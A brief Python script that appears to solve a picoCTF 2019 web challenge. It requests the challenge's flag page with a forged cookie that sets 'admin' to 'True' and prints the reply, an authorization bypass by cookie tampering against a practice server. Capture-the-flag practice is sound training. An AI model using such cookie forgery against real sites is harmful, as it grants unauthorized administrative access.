import requests
data = {'password' :'a','username':'a','admin' :'True'}
cookie = {'password':'','username':'','admin':'True'}
a = requests.get('https://2019shell1.picoctf.com/problem/21895/flag',cookies = cookie)
print(a.text)